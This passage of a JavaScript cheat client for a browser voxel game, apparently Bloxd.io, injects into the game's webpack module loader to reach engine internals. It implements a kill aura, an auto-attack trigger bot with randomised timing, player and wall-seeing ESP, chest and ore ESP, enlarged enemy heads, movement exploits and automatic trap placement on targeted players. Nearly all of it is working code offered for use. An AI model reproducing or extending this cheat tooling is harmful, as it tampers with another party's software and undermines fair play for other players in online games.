        console.log("NOT INJECTED NO TARGET");
        return;
    }

    const rendering = r.values(shideFuxny.rendering)[18];
    const objectData = rendering?.objectData;
    if (!objectData || !eIdKey) return;

    const activeEIds = new Set();

    // First, build a set of currently valid entity IDs
    for (const key in objectData) {
        if (key === "1") continue;
        const obj = objectData[key];
        const eId = obj[eIdKey];

        if (
            eId == null ||
            eId === myId ||
            obj.pickable === false ||
            obj.type !== "Player" ||
            !shideFuxny.entities.getState(eId, "genericLifeformState")
        ) continue;

        activeEIds.add(eId);

        // If hitbox already exists, skip
        if (hitboxes[eId]) continue;

        // Create the hitbox
        let newBox_00 = shideFuxny.Lion.Mesh.CreateBox("mesh", 1, false, 1, shideFuxny.Lion.scene);
        newBox_00.renderingGroupId = 2;

        newBox_00.material = new shideFuxny.Lion.StandardMaterial("mat", shideFuxny.Lion.scene);
        newBox_00.material.diffuseColor = new shideFuxny.Lion.Color3(1, 1, 1);
        newBox_00.material.emissiveColor = new shideFuxny.Lion.Color3(1, 1, 1);
        newBox_00.name = '_';
        newBox_00.id = '__' + eId;

        let defaultPosition = new newBox_00.position.constructor(0, 0.32, 0);
        newBox_00.position = defaultPosition.clone();
        newBox_00._scaling._y = 2.2;
        newBox_00.material.alpha = 0.5;
        newBox_00.isVisible = hitBoxEnabled;

        rendering.attachTransformNode(newBox_00, key, 13);
        r.values(shideFuxny.rendering)[27].call(shideFuxny.rendering, newBox_00);

        Object.defineProperty(newBox_00._nodeDataStorage, '_isEnabled', {
            get: () => true,
            set: (v) => {},
            configurable: false
        });

        hitboxes[eId] = newBox_00;
    }

    // Cleanup hitboxes of players no longer present
    for (const eId in hitboxes) {
        if (!activeEIds.has(eId)) {
            hitboxes[eId]?.dispose();
            delete hitboxes[eId];
        }
    }

    // Visibility toggle based on node[0].enabled and hitBoxEnabled
    for (const key in objectData) {
        const obj = objectData[key];
        const eId = obj?.[eIdKey];
        if (!eId || !hitboxes[eId]) continue;

        const baseNode = obj.nodes?.[0];
        if (!baseNode) continue;

        hitboxes[eId].isVisible = baseNode.enabled && hitBoxEnabled;
    }
}



(() => {
    // Remove if already present
    const old = document.getElementById("vertical-health-bar");
    if (old) old.remove();

    // Create bar container
    const container = document.createElement("div");
    container.id = "vertical-health-bar";
    Object.assign(container.style, {
        position: "fixed",
        left: "calc(50% - 200px)", // 100px left of center
        top: "50%",
        transform: "translateY(-50%)",
        width: "4px",
        height: "200px",
        background: "#000",
        border: "2px solid black",
        zIndex: 120,
        pointerEvents: "none",
        display: "flex",
        alignItems: "flex-end",
        overflow: "hidden"
    });

    // Create fill element
    const fill = document.createElement("div");
    Object.assign(fill.style, {
        width: "100%",
        height: "100%",
        background: "limegreen",
        transform: "scaleY(1)",
        transformOrigin: "bottom",
        transition: "transform 0.2s ease, background 0.2s ease", // <-- add comma here
    });

    container.appendChild(fill);
    document.body.appendChild(container);

    // Function to compute smooth gradient color from green → red
    function getHealthColor(health) {
        const ratio = health / 100;

        if (ratio > 0.5) {
            // Bright green → orange
            const t = (ratio - 0.5) * 2;
            const r = Math.round(255 * (1 - t));
            const g = 255;
            return `rgb(${r}, ${g}, 0)`; // green to yellow to orange
        } else {
            // Orange → red
            const t = ratio * 2;
            const r = 255;
            const g = Math.round(255 * t);
            return `rgb(${r}, ${g}, 0)`; // orange to red
        }
    }


    // Global health setter and show/hide toggle
    setHealthBar = function(health, show = true) {
        const clamped = Math.max(0, Math.min(health, 100));
        fill.style.transform = `scaleY(${clamped / 100})`;
        fill.style.background = getHealthColor(clamped);
        container.style.display = show ? "flex" : "none";
    };
})();

setHealthBar(100, false)

function toggleEnemyHealthGui() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
    enemyHealthGuiEnabled = !enemyHealthGuiEnabled;

    if (enemyHealthGuiEnabled) {
        startHealthWatcher();
    } else {
        // Toggle off: clean up everything
        if (healthWatcherInterval) clearInterval(healthWatcherInterval);
        if (resetTimeout) clearTimeout(resetTimeout);
        setHealthBar(100, false); // hide bar
        lastPercent = null;
    }
    updateEnemyHealthGuiButton();
}

function startHealthWatcher() {
	everEnabled.enemyHealthGuiEnabled = true;
    if (healthWatcherInterval) clearInterval(healthWatcherInterval);

    healthWatcherInterval = setInterval(() => {
        const list = shideFuxny.entities[shideFuxny.impKey].entityName.list;
        let percent = null;
        let foundTarget = false;


        for (let i = 0; i < list.length; i++) {
            const targetEntity = list[i];
            if (r.values(targetEntity)[0] === lastClosestId) {
                percent = r.values(targetEntity)[7];
                foundTarget = true;
                break;
            }
        }

        // Hide health bar if not found, or at full/near full
        if (!foundTarget || percent === 0 || percent >= 1) { // ) {
            if (resetTimeout) {
                clearTimeout(resetTimeout)
            };
            setHealthBar(100, false);
            lastPercent = null;
            return;
        }

        // Update bar only if changed
        if (percent !== null) {
            lastPercent = percent;
            lastChangeTime = Date.now();
            setHealthBar(percent * 100, true);

            if (resetTimeout) clearTimeout(resetTimeout);
            resetTimeout = setTimeout(() => {
                setHealthBar(100, false);
                lastPercent = null;
            }, 10000);
        }
    }, 300);
}
/*
	function emitSafePrimaryFire() {
		const realEvent = new MouseEvent("mousedown");
		const fakeEvent = {
			timeStamp: performance.now(),
			altKey: false,
			ctrlKey: realEvent.ctrlKey,
			shiftKey: realEvent.shiftKey,
			metaKey: realEvent.metaKey,
			button: realEvent.button,
			buttons: realEvent.buttons,
			clientX: realEvent.clientX,
			clientY: realEvent.clientY,
			screenX: realEvent.screenX,
			screenY: realEvent.screenY
		};

		shideFuxny.NIGHT.inputs.down.emit("primary-fire", fakeEvent);
	}*/

function checkAndClick() {
    const hit = playerEntity.tryHitEntity();

    if (hit?.hitEId != null) {
        if (
            //!playerEntity.breaking &&
            //!inMenu() &&
            shideFuxny.entities.getState(1, "genericLifeformState").isAlive &&
            shideFuxny.entities.getState(hit.hitEId, "genericLifeformState") &&
            shideFuxny.entities.getState(hit.hitEId, "genericLifeformState").isAlive &&
            r.values(shideFuxny.entityList)?.[1]?.[hit.hitEId].canAttack
        ) {
			emitSafePrimaryFire();
            //['mousedown','mouseup','click'].forEach(t => document.querySelector('canvas')?.dispatchEvent(new MouseEvent(t,{bubbles:true,cancelable:true,view:window,clientX:innerWidth/2,clientY:innerHeight/2,buttons:1})));
            lastClosestId = hit.hitEId
        }
    }
}




function toggleTriggerBot() {
    if (!injectedBool) {
        showTemporaryNotification('You need to inject first habibi!')
    }
	everEnabled.triggerBotEnabled = true;
    if (triggerBotEnabled) {
        clearTimeout(toggleTriggerBotInterval);
        triggerBotEnabled = false;
        console.log("⛔ Auto-attack stopped");
    } else {
        triggerBotEnabled = true;

        function autoAttackLoop() {
            if (!triggerBotEnabled) return;
            checkAndClick();
            const nextDelay = ATTACK_INTERVAL_MS + (Math.random() * 40 - 20); // ±20ms
            toggleTriggerBotInterval = setTimeout(autoAttackLoop, nextDelay);
        }
        autoAttackLoop();
        console.log("▶️ Auto-attack started");
    }
    updateTriggerBotButton();
}


function toggleLockPlayerWaterState() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.waterJumpingEnabled = true;
    const movementList = shideFuxny.entities[shideFuxny.impKey]?.movement?.list;
    if (!Array.isArray(movementList) || movementList.length === 0) return;

    const c = movementList[0];

    if (waterJumpingEnabled) {
        // Restore defaults (optional: redefine properties as writable again)
        waterJumpingEnabled = false;
        console.log("🔓 Player water state unlocked");
        updateWaterJumpButton();
        return;
    }

    try {
        Object.defineProperty(c, "inAirFromWater", {
            get: () => false,
            set: () => {},
            configurable: true
        });

        Object.defineProperty(c, "_jumpCount", {
            get: () => 0,
            set: () => {},
            configurable: true
        });

        Object.defineProperty(c, "_ticksOutOfWater", {
            get: () => 346,
            set: () => {},
            configurable: true
        });

        // Add this too if you want to lock ice status:
        Object.defineProperty(c, "isOnIce", {
            get: () => true,
            set: () => {},
            configurable: true
        });

        waterJumpingEnabled = true;
        console.log("🔒 Player water state locked");
        updateWaterJumpButton();
    } catch (e) {
        console.error("Error locking player water state:", e);
    }
}


let bigHeadsInterval = null;

function toggleBigHeads() {
	if (!injectedBool) {
		showTemporaryNotification('You need to inject first habibi!');
		return;
	}
	everEnabled.bigHeadsEnabled = true;
	const objectData = r.values(shideFuxny.rendering)[18].objectData;

	if (!bigHeadsEnabled) {
		// Initial scale-up
		for (let key in objectData) {
			let obj = objectData[key];

			if (obj?.type === "Player" && obj.nodes?.[16] && obj !== objectData[1]) {
				let node = obj.nodes[16];

				node.scale._x = 6;
				node.scale._y = 6;
				node.scale._z = 6;

				node.position._y = -1;
			}
		}

		// Start periodic check every 10 seconds
		bigHeadsInterval = setInterval(() => {
			for (let key in objectData) {
				let obj = objectData[key];

				if (obj?.type === "Player" && obj.nodes?.[16] && obj !== objectData[1]) {
					let node = obj.nodes[16];

					// Only update if scale hasn't already been changed
					if (node.scale._x === 1 && node.scale._y === 1 && node.scale._z === 1) {
						node.scale._x = 6;
						node.scale._y = 6;
						node.scale._z = 6;

						node.position._y = -1;
					}
				}
			}
		}, 10000); // 10 seconds
	} else {
		// Restore original size
		for (let key in objectData) {
			let obj = objectData[key];

			if (obj?.type === "Player" && obj.nodes?.[16] && obj !== objectData[1]) {
				let node = obj.nodes[16];

				node.scale._x = 1;
				node.scale._y = 1;
				node.scale._z = 1;

				node.position._y = 0.7199999690055847;
			}
		}

		// Clear the interval
		clearInterval(bigHeadsInterval);
		bigHeadsInterval = null;
	}

	bigHeadsEnabled = !bigHeadsEnabled;
	updateBigHeadButton();
}


function toggleWallJumpScript() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.wallJumpRunning = true;
    const client = shideFuxny?.clientOptions;
    const body = shideFuxny?.physics?.bodies?.[0];

    if (!client || !body) return;

    if (wallJumpRunning) {
        // Unlock airJumpCount (optional reset)
        Object.defineProperty(client, "airJumpCount", {
            value: 0,
            writable: true,
            configurable: true
        });

        wallJumpRunning = false;
        console.log("🧱 Wall jump script disabled");
        updateWallJumpButton();
        return;
    }

    // Lock airJumpCount based on body.resting direction
    Object.defineProperty(client, "airJumpCount", {
        get() {
            if (!body.resting) return 0;
            const [rx, , rz] = body.resting;
            return (rx === 1 || rx === -1 || rz === 1 || rz === -1) ? 999 : 0;
        },
        set(_) {}, // Prevent assignment
        configurable: true
    });

    wallJumpRunning = true;
    console.log("🧱 Wall jump script enabled");
    updateWallJumpButton();
}




function wangPlace(position) {

    let heldBlock = r.values(shideFuxny.NIGHT.entities[shideFuxny.impKey])[22].list[0]._blockItem;
    let worldInstanceKey = Object.keys(heldBlock)[0];
    let worldInstance = Object.values(heldBlock)[0];
    let targetedBlockKey = Object.keys(worldInstance)[25];
    let targetedBlock = worldInstance[targetedBlockKey];

    function spoofTargetedBlock(position) {
        return new Proxy({}, {
            get(target, prop, receiver) {
                if (prop === worldInstanceKey) {
                    return new Proxy(worldInstance, {
                        get(inner, key) {
                            if (key === targetedBlockKey) {
                                let spoofedTargetedBlock = structuredClone(targetedBlock) || {};
                                spoofedTargetedBlock.position = position;
                                return spoofedTargetedBlock;
                            }
                            return worldInstance[key];
                        },
                    });
                }

                if (prop == "checkTargetedBlockCanBePlacedOver") {
                    return () => true;
                }

                if (typeof heldBlock[prop] == "function") {
                    return heldBlock[prop].bind(heldBlock);
                } else {
                    return heldBlock[prop];
                }
            },
        });
    }

    heldBlock.placeBlock.call(spoofTargetedBlock(position));
}

function placeToPlayer(position) {

    // Convert to block coordinates by flooring each component
    const blockX = Math.floor(position[0]);
    const blockY = Math.floor(position[1]);
    const blockZ = Math.floor(position[2]);
    if (playerEntity.checkTargetedBlockCanBePlacedOver([blockX, blockY - 3, blockZ]) || r.values(shideFuxny.world)[47].call(shideFuxny.world, blockX, blockY - 3, blockZ) === 0) {
        wangPlace([blockX, blockY - 3, blockZ])
    }
    if (playerEntity.checkTargetedBlockCanBePlacedOver([blockX, blockY - 2, blockZ]) || r.values(shideFuxny.world)[47].call(shideFuxny.world, blockX, blockY - 2, blockZ) === 0) {
        wangPlace([blockX, blockY - 2, blockZ])
    }
    if (playerEntity.checkTargetedBlockCanBePlacedOver([blockX, blockY - 1, blockZ]) || r.values(shideFuxny.world)[47].call(shideFuxny.world, blockX, blockY - 1, blockZ) === 0) {
        wangPlace([blockX, blockY - 1, blockZ])
    }
    if (playerEntity.checkTargetedBlockCanBePlacedOver([blockX, blockY, blockZ]) || r.values(shideFuxny.world)[47].call(shideFuxny.world, blockX, blockY, blockZ) === 0) {
        wangPlace([blockX, blockY, blockZ])
    }

}

function placeSpike(position) {

    // Convert to block coordinates by flooring each component
    const blockX = Math.floor(position[0]);
    const blockY = Math.floor(position[1]);
    const blockZ = Math.floor(position[2]);
    if (playerEntity.checkTargetedBlockCanBePlacedOver([blockX, blockY + 1, blockZ]) || r.values(shideFuxny.world)[47].call(shideFuxny.world, blockX, blockY + 1, blockZ) === 0) {
        wangPlace([blockX, blockY + 1, blockZ])
    }
}

function moveItem(itemName, desiredSlot) {
    if (!playerInventoryParent || !playerInventoryParent.playerInventory?.items) {
        console.warn("❌ playerInventoryParent is not set. Run findAndSavePlayerInventoryParent() first.");
        return false;
    }
    const items = playerInventoryParent.playerInventory.items;
    let oldSlot = null;
    for (let i = 0; i < items.length; i++) {
        const item = items[i];

        if (!item || typeof item.name !== 'string') continue;
        const name = item.name.toLowerCase();
        if (name.includes(itemName)) {


            oldSlot = i;
            break;
        }
    }
    if (oldSlot === null) {
        console.warn(`❌ No ${itemName} found in slot 10 or higher.`);
        return false;
    }
    console.log(`🔁 Swapping ${itemName} from slot ${oldSlot} with slot ${desiredSlot}`);
    playerInventoryParent.swapPosClient(oldSlot, desiredSlot, null);
    return true;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function autoSW() {
    if (lastClosestId && targetEntityDistance <= 36) { // place web then spikes

        if (moveItem("net", webSlot) || moveItem("web", webSlot)) {
            let enemyPos = shideFuxny.entities.getState(lastClosestId, 'position').position;

            shideFuxny.NIGHT.inputs.down['_events'][`HotBarSlot${webSlot + 1}`]();

            placeToPlayer(enemyPos);

            await sleep(50); // delay before switching to spikes

            if (moveItem("spikes", spikeSlot)) {
                shideFuxny.NIGHT.inputs.down['_events'][`HotBarSlot${spikeSlot + 1}`]();
                placeSpike(enemyPos);
            }
        } else { // just place spikes
            if (moveItem("spikes", spikeSlot)) {
                shideFuxny.NIGHT.inputs.down['_events'][`HotBarSlot${spikeSlot + 1}`]();
                await sleep(50);

                let enemyPos = shideFuxny.entities.getState(lastClosestId, 'position').position;
                placeToPlayer(enemyPos);
            } else {
                console.log("no spikes or webs!");
            }
        }
        shideFuxny.NIGHT.inputs.down['_events'].HotBarSlot1();
    } else {
        console.log("No target or too far");
    }
	if (!everEnabled.autoSWUsed) {verEnabled.autoSWUsed = true};
}


function startTargetFinder() {
    let armourNodeNum = r.values(shideFuxny.rendering)[18].getNamedNode(1, "Body|Armour")
    let closestObj = null;
    targetFinderId = setInterval(() => {
        if (!injectedBool) {

            console.log("NOT INJECTED NO TARGET")
        }
		
		if (!shideFuxny.entities.getState(1, "genericLifeformState").isAlive) return;
		 
        const myPos = shideFuxny.entities.getState?.(myId, 'position')?.position;
        if (!myPos) return;

        const rendering = r.values(shideFuxny.rendering)[18];
        const objectData = rendering?.objectData;
        if (!objectData) return;

        if (!eIdKey) return;

        let closestId = null;
        let minDist = 100;


        for (const key in objectData) {
            const obj = objectData[key];
            const eId = obj[eIdKey];
			
            if (
                eId == null ||
                obj.type !== "Player" ||
                obj.pickable === false ||
                eId === myId ||
                !shideFuxny.entities.getState(eId, "genericLifeformState") ||
                !shideFuxny.entities.getState(eId, "genericLifeformState").isAlive
            ) continue;


            if (!eId || eId === myId || obj.pickable === false || obj.type !== "Player") continue;
			
            const state = shideFuxny.entities.getState(eId, "genericLifeformState");
            if (!state || !state.isAlive) continue;

            const ent = r.values(shideFuxny.entityList)?.[1]?.[eId];
            if (!ent || ent.canAttack !== true) continue;

            const pos = shideFuxny.entities.getState(eId, 'position')?.position;
            if (!pos) continue;

            const dx = pos[0] - myPos[0];
            const dy = pos[1] - myPos[1];
            const dz = pos[2] - myPos[2];

            //if (Math.abs(dy) > 3) continue; // optional Y-axis restriction
            const dist = dx * dx + dy * dy + dz * dz;
            if (dist < minDist) {
                minDist = dist;
                closestId = eId;
                closestObj = obj;
            }
			
        }
		

        const armourNode = closestObj?.nodes?.[armourNodeNum];
        if (armourNode?.actuallyEnabled) {
            newBox.name = possibleNames[1];
            newBox.id = possibleNames[1];
        } else {
            newBox.name = possibleNames[0];
            newBox.id = possibleNames[0];
        }


        if (closestId != null) {
            newBox.metadata.eId = closestId;
			//console.log(newBox.id,"  ",closestId)
            if (closestId !== lastClosestId) {
                if (hitboxes[closestId]) {
                    hitboxes[closestId].material.diffuseColor = new shideFuxny.Lion.Color3(1, 0, 0);
                    hitboxes[closestId].material.emissiveColor = new shideFuxny.Lion.Color3(1, 0, 0);
                    for (const id in hitboxes) {
                        if (id !== closestId && hitboxes[id]) {
                            hitboxes[id].material.diffuseColor = new shideFuxny.Lion.Color3(1, 1, 1);
                            hitboxes[id].material.emissiveColor = new shideFuxny.Lion.Color3(1, 1, 1);
                        }
                    }
                }

                lastClosestId = closestId;
            }
        } else {
			//newBox.metadata.eId = null;
            lastClosestId = null;
        }

        // Final visibility and distance logic
        if (killAuraEnabled && closestId != null && minDist < 64) { //16 for now
            newBox[__nullKey] = true;
            targetEntityDistance = Math.floor(Math.sqrt(minDist));
        } else {
            newBox[__nullKey] = false;
            targetEntityDistance = null;
        }


    }, 100);
}

function toggleKillAura() {
    if (!injectedBool) {
        showTemporaryNotification('You need to inject first habibi!');
        return;
    }
	everEnabled.killAuraEnabled = true;
    if (killAuraEnabled) {
        console.log("⛔ Kill aura disabled");
    } else {
        newBox[__nullKey] = false;

    }
    killAuraEnabled = !killAuraEnabled;
    updateKillAuraButton();
}



function toggleHitBoxes() {
    if (!injectedBool) {
        showTemporaryNotification('You need to inject first habibi!');
        return;
    }
	everEnabled.hitBoxEnabled = true;
    hitBoxEnabled = !hitBoxEnabled;

    // Toggle visibility on all hitboxes
    for (const eId in hitboxes) {
        const box = hitboxes[eId];
        if (box && box.isVisible !== hitBoxEnabled) {
            box.isVisible = hitBoxEnabled;
        }
    }

    updateHitboxButton();
}


function toggleSkybox() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.skyBoxEnabled = true;
    (function saveSkyboxEntity() {
        for (let i = 0; i < 10000; i++) {
            const meshState = shideFuxny.entities.getState(i, "mesh");
            if (meshState?.mesh?.id === "skyBox") {
                console.log(`✔ Found skyBox entity: ${i}`);
                skyboxEntity = i; // Save globally
                skyboxMesh = meshState.mesh; // Optional: save mesh reference too
                break;
            }
        }
    })();

    if (!skyboxMesh) {
        console.warn("❌ skyboxMesh is not defined.");
        return;
    }

    isSkyboxHidden = !isSkyboxHidden;
    skyboxMesh.isVisible = isSkyboxHidden ? false : true;

    console.log(`🌌 Skybox is now ${isSkyboxHidden ? "hidden" : "visible"}`);
    updateSkyboxButton()
}

/*
 function rainbowSky() {
	 rainbowSkyEnabled = !rainbowSkyEnabled
	 
	 if (!rainbowSkyEnabled) {
		
	 }
	 
	 
	 
	 
	 
	 
	 
	 
 }*/



function toggleWireframe() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.wireFramesBool = true;
    wireFramesBool = !wireFramesBool;

    const renderings = r.values(shideFuxny.rendering);
    for (const rendering of renderings) {
        const thinMeshes = r.values(shideFuxny.rendering)[18].thinMeshes;
        if (!Array.isArray(thinMeshes)) continue;

        for (const thinMesh of thinMeshes) {
            const mesh = thinMesh?.mesh;
            const material = mesh?.material;
            const name = mesh?.name;

            if (
                material &&
                typeof material.wireframe === "boolean" &&
                !(typeof name === "string" && name.includes("Armour"))
            ) {
                material.wireframe = wireFramesBool;
            }
        }
    }

    updateWireframeButton();
}


let chestESPEnabled = false;
let oreESPEnabled = false;
let chestOreInterval = null;
let chestBoxes = {};


function clearESPBoxes() {
    for (const key in chestBoxes) {
        for (const {
                mesh,
                id
            }
            of chestBoxes[key]) {
            mesh.dispose();
            shideFuxny.entities.deleteEntity(id);
        }
    }
    scannedChunks.clear();
    chestBoxes = {};
}


function reverseIndex(i, stride) {
    const x = Math.floor(i / stride[0]);
    const remX = i % stride[0];
    const y = Math.floor(remX / stride[1]);
    const z = remX % stride[1];
    return [x, y, z];
}

function getChunkKey(chunk) {
    const [wx, wy, wz] = chunk.pos || [0, 0, 0];
    const cx = Math.floor(wx / 32);
    const cy = Math.floor(wy / 32);
    const cz = Math.floor(wz / 32);
    return `${cx}|${cy}|${cz}|overworld`;
}

function scanChunk(chunk, blockIDs) {
    const blockData = chunk[chunkDataField];
    if (!blockData) return;

    const {
        data,
        stride
    } = blockData;

    const pos = chunk.pos || [0, 0, 0];
    if (!data || !stride) return;

    const chunkKey = getChunkKey(chunk);
    for (let i = 0; i < data.length; i++) {
        const blockID = data[i];
        if (!blockIDs.includes(blockID)) continue;




        const [x, y, z] = reverseIndex(i, stride);
        const worldX = pos[0] + x + 0.5;
        const worldY = pos[1] + y + 0.5;
        const worldZ = pos[2] + z + 0.5;

        const mesh = shideFuxny.Lion.Mesh.CreateBox("espbox", 0.5, false, 1, shideFuxny.Lion.scene);
        mesh.position.set(worldX, worldY, worldZ);
        mesh.renderingGroupId = 1;

        mesh.material = new shideFuxny.Lion.StandardMaterial("mat", shideFuxny.Lion.scene)

        const id = shideFuxny.entities.add([worldX, worldY, worldZ], null, null, mesh);
        if (!chestBoxes[chunkKey]) chestBoxes[chunkKey] = [];
        chestBoxes[chunkKey].push({
            mesh,
            id
        });


        if ([204, 205, 206, 207].includes(blockID)) {
            console.log("FOUNDCHEST")

            mesh.material.diffuseColor = new shideFuxny.Lion.Color3(1, 0.5, 0); // orange
            mesh.material.emissiveColor = new shideFuxny.Lion.Color3(1, 0.5, 0); // makes it glow orange
        }
        if (blockID === 45) {
            mesh.material.diffuseColor = new shideFuxny.Lion.Color3(0, 0, 1); // blue
            mesh.material.emissiveColor = new shideFuxny.Lion.Color3(0, 0, 1); // makes it glow blue
        }

        if (blockID === 465) {
            mesh.material.diffuseColor = new shideFuxny.Lion.Color3(0.7, 0.5, 1); // pale purple
            mesh.material.emissiveColor = new shideFuxny.Lion.Color3(0.7, 0.5, 1); // makes it glow pale purple
        }




    }
}




function scanAllChunks() {
    if (!shideFuxny?.world || !shideFuxny?.world?.[shideFuxny.impKey]?.hash) return;
    const chunkHash = shideFuxny.world[shideFuxny.impKey].hash;
    // Step 1: Remove boxes for chunks no longer loaded
    for (const scannedKey of scannedChunks) {
        if (!(scannedKey in chestBoxes)) continue;

        if (!Object.values(chunkHash).some(chunk => getChunkKey(chunk) === scannedKey)) {
            // Delete all meshes for this chunk
            for (const {
                    mesh,
                    id
                }
                of chestBoxes[scannedKey]) {
                mesh.dispose(); // remove from scene
                shideFuxny.entities.deleteEntity(id); // remove from entity system if needed
            }
            delete chestBoxes[scannedKey];
            scannedChunks.delete(scannedKey);
        }
    }

    // Step 2: Scan newly loaded chunks
    for (const chunkKey in chunkHash) {

        const chunk = chunkHash[chunkKey];
        if (!chunkDataField) {
            autoDetectChunkDataField(chunk);
            if (!chunkDataField) continue; // Skip if still not found
        }

        const blockData = chunk[chunkDataField];
        if (!blockData?.data || !blockData.stride || !chunk.pos) continue;


        const key = getChunkKey(chunk);
        if (scannedChunks.has(key)) continue;
        scannedChunks.add(key);
        if (chestESPEnabled) scanChunk(chunk, [204, 205, 206, 207]);
        if (oreESPEnabled) scanChunk(chunk, [44, 45, 465, 50]);
    }
}


function toggleChestESP() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.chestESPEnabled = true;
    chestESPEnabled = !chestESPEnabled;
    if (chestESPEnabled || oreESPEnabled) {
        scanAllChunks();
        chestOreInterval = setInterval(scanAllChunks, 5000);
    } else {
        clearInterval(chestOreInterval);
        chestOreInterval = null;
        clearESPBoxes();
        scannedChunks.clear(); // Allow rescan next time
    }
    updateChestESPButton();
}

function toggleOreESP() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.oreESPEnabled = true;
    oreESPEnabled = !oreESPEnabled;
    if (chestESPEnabled || oreESPEnabled) {
        scanAllChunks();
        chestOreInterval = setInterval(scanAllChunks, 5000);
    } else {
        clearInterval(chestOreInterval);
        chestOreInterval = null;
        clearESPBoxes();
        scannedChunks.clear(); // Allow rescan next time
    }
    updateOreESPButton();
}



function toggleESP() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
	everEnabled.espEnabled = true;
    if (!shideFuxny.impKey) return;
    espEnabled = !espEnabled;
    const groupId = espEnabled ? 2 : 0;

    if (Array.isArray(r.values(shideFuxny.rendering)[18].thinMeshes)) {
        for (const thinMesh of r.values(shideFuxny.rendering)[18].thinMeshes) {
            if (thinMesh?.mesh && typeof thinMesh.mesh.renderingGroupId === "number") {
                thinMesh.mesh.renderingGroupId = groupId;
            }
        }
        console.log(`✅ Thin meshes render group set to ${groupId}`);
    } else {
        console.error("❌ thinMeshes array not found.");
    }
    updateESPButton?.();
}




// Utility Functions
function findNoaAndKey() {

		let winDescriptors = Object.getOwnPropertyDescriptors(window);
        let wpName = Object.keys(winDescriptors).find(key => winDescriptors[key]?.set?.toString().includes("++"));
        let wpInstance = null;
		
		if (wpName) {wpInstance = window[wpName] = window[wpName]}
		
	if (wpInstance) {
		wpInstance.push([
			[Math.floor(Math.random() * 90000) + 10000], {},
			function(wpRequire) {
				shideFuxny.findModule = (code) => wpRequire(Object.keys(wpRequire.m)[Object.values(wpRequire.m).findIndex(m => m.toString().includes(code))]);
				shideFuxny.Props = Object.values(shideFuxny.findModule("nonBlocksClient:")).find(prop => typeof prop == "object");
				shideFuxny.NIGHT = Object.values(shideFuxny.Props).find(prop => prop?.entities);
				//Credits to, you guessed it wang!
			}
		]);
	}
	
    if (!shideFuxny.NIGHT) {
		usingAltInjection = true;
        console.warn("❌ Could not find noa, using backup.");

			function findObjectsWithEntitiesAndCamera(obj) {
			  const matches = [];
			  const visited = new WeakSet();

			  function recurse(current, path = []) {
				if (typeof current !== 'object' || current === null) return;
				if (visited.has(current)) return;
				visited.add(current);

				const keys = Object.keys(current);
				if (keys.includes('entities') && keys.includes('camera')) {
				  matches.push({
					path: path.join('.'),
					object: current
				  });
				}

				for (const key of keys) {
				  const value = current[key];
				  if (typeof value === 'object' && value !== null) {
					recurse(value, [...path, key]);
				  }
				}
			  }

			  recurse(obj);
			  return matches;
			}


			const result = findObjectsWithEntitiesAndCamera(window);
			shideFuxny.NIGHT = result[0].object


    };


    const targetValue = r.values(shideFuxny.NIGHT.entities)[2];
    const entityEntries = Object.entries(shideFuxny.NIGHT.entities);
    shideFuxny.impKey = entityEntries.find(([_, val]) => val === targetValue)?.[0];
    shideFuxny.registry = r.values(shideFuxny.NIGHT)[17]
    shideFuxny.rendering = r.values(shideFuxny.NIGHT)[12]
    shideFuxny.entities = shideFuxny.NIGHT.entities;



    if (shideFuxny.impKey) {
        console.log("importantList identified:", shideFuxny.impKey);

        // Attempt to find BHOP references
        const key = shideFuxny.impKey;
        if (key) {
            const entity = shideFuxny.NIGHT.entities?.[key];
            if (entity?.moveState?.list?.[0] && entity?.movement?.list?.[0]) {
                playerKey = key;
                moveState = entity.moveState.list[0];
                physState = entity.movement.list[0];
                cachedBHOPParent = entity;
                console.log("✅ Cached BHOP entity data");
            } else {
                console.warn("⚠️ Found key but missing BHOP components");
            }
        } else {
            console.warn("❌ BHOP player key not found");
		}
    }

    (function findECS() {
        const noaObj = shideFuxny.NIGHT;
        if (!noaObj) {
            console.error("❌ noa object not found");
            return;
        }

        for (const [key, val] of Object.entries(noaObj)) {
            if (key === "entities") continue; // skip known non-ECS

            if (typeof val === "object" && typeof val.getState === "function") {
                console.log(`✅ Found ECS at noa.${key}`);
                shideFuxny.ECS = val;
                break;
            }
        }

    })();

    function findeIdKey() {

        const rendering = r.values(shideFuxny.rendering)[18];
        const objectData = rendering?.objectData;
        if (!objectData) return;

        const sample = objectData[1];
        for (const key in sample) {
            if (sample[key] === 1) {
                eIdKey = key;
                break;
            }
        }
    }

    findeIdKey();

    function findAddComponentFunction(obj) {
        const exclude = ['overwriteComponent', 'deleteComponent', 'removeComponent', 'getState'];
        for (const key in obj) {
            if (exclude.includes(key)) continue;
            const fn = obj[key];
            if (typeof fn !== 'function') continue;
            try {
                fn(999999, "__FAKE_COMPONENT__", {});
            } catch (err) {
                const msg = (err?.message || "").toLowerCase();
                if (
                    msg.includes("unknown component") ||
                    msg.includes("already has component") ||
                    (msg.includes("component") && msg.includes("missing"))
                ) {
                    console.log(`🧩 Candidate: ${key} → likely addComponent()`);
                    return key;
                }
            }
        }
        console.warn("❌ Could not identify an addComponent-like function.");
        return null;
    }



    let mesh = r.values(shideFuxny.rendering)[7].meshes[0];
    let scene = r.values(shideFuxny.rendering)[7];
    let engine = scene.getEngine();
    let StandardMaterial = mesh.material.constructor;
    let Color3 = mesh.material.diffuseColor.constructor;
    const addKey = findAddComponentFunction(shideFuxny.NIGHT.entities);
    const addComponent = shideFuxny.NIGHT.entities[addKey];
    shideFuxny.world = r.values(shideFuxny.NIGHT)[11]
    shideFuxny.physics = shideFuxny.NIGHT.physics
    shideFuxny.camera = shideFuxny.NIGHT.camera
    shideFuxny.bloxd = shideFuxny.NIGHT.bloxd
    shideFuxny.clientOptions = r.values(shideFuxny.NIGHT)[29]
    shideFuxny.Lion = {
        scene,
        engine,
        InstancedMesh: mesh.constructor,
        Mesh: mesh.constructor,
